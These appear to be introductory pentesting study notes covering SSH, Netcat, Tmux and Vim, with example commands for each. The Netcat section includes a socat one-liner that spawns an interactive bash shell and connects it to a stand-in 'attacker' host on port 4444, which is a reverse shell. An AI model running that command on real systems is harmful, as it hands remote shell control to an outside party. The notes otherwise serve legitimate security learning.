# Basic Tools Summary

Essential tools for infosec: SSH, Netcat, Tmux, Vim. Master for daily use and pentesting. Not pentest-specific but critical for process.

## Using SSH

- Network protocol (default port 22); secure remote access.
- Auth: Password or key-based.
- Uses: Remote login, port forwarding, file transfer, jump hosts.
- Client-server model (e.g., OpenSSH).
- Stable for enumeration/attacks post-exploit.

**Commands/Examples**:

- Connect: `ssh Bob@10.10.10.10` (prompts for password).
- Key auth: Read private keys or add public key (covered later).

**Additional**: Port forwarding: `ssh -L local:remote user@host` (local tunnel). Tools: PuTTY (Windows). Secure alternative to Telnet.

## Using Netcat

- Network utility for TCP/UDP; "Swiss Army knife".
- Uses: Shell connections, banner grabbing, file transfer.
- Pre-installed on Linux; Windows: Download or PowerCat (PowerShell).

**Commands/Examples**:

- Banner grab: `netcat 10.10.10.10 22` (shows SSH banner).
- File transfer: `nc -lvp 1234 > file` (receive); `nc target 1234 < file` (send).

**Additional**: Socat: Advanced (port forwarding, serial); upgrade shells: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444`. Standalone binary for transfers.

## Using Tmux

- Terminal multiplexer; multiple windows/panes in one terminal.
- Install: `sudo apt install tmux -y`.
- Prefix: `ctrl+b`.
- Logging: Useful for engagements.

**Commands/Examples**:

- Start: `tmux`.
- New window: `prefix c`.
- Switch window: `prefix 1` (to window 1).
- Split vert: `prefix shift+%`.
- Split horiz: `prefix shift+"`.
- Switch panes: `prefix ->` (right).

## Using Vim

- Keyboard-based text editor; efficient for code/files.
- Pre-installed on Linux; edit remote files.
- Modes: Normal (read/navigate), Insert (edit), Command (save/quit).

**Commands/Examples**:

- Open: `vim /etc/hosts`.
- Insert: `i` (edit); `esc` (back to normal).
- Shortcuts (normal mode):
  - `x`: Cut char.
  - `dw`: Cut word.
  - `dd`: Cut line.
  - `yw`: Copy word.
  - `yy`: Copy line.
  - `p`: Paste.
  - Multiply: `4yw` (copy 4 words).
- Command mode (`:`):
  - `:1`: Go to line 1.
  - `:w`: Save.
  - `:q`: Quit.
  - `:q!`: Quit no save.
  - `:wq`: Save quit.

**Additional**: Plugins/extensions for IDE-like features. Alternatives: Nano (`nano file` - simpler). Practice for remote editing. Cheatsheet: Unlock power.
